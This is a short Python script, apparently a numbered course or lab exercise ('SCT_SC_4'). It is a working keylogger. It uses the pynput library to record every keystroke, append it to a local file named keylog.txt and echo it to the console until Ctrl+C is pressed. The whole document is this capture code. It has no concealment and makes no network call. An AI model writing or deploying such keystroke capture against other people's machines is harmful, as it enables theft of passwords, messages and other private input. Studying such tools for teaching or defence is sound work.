# SCT_SC_4
from pynput.keyboard import Listener
import os

LOG_FILE = "keylog.txt"

def log_key(key):
    try:
        key = key.char  # Get character for normal keys
    except AttributeError:
        key = str(key)  # Convert special keys to string
    
    with open(LOG_FILE, "a") as file:
        file.write(key + " ")
    
    print(key, end=" ", flush=True)  # Print to console

def main():
    print("[+] Keylogger Started. Press Ctrl+C to stop.")
    with Listener(on_press=log_key) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            print("\n[+] Keylogger Stopped.")
            listener.stop()
            
if __name__ == "__main__":
    main()
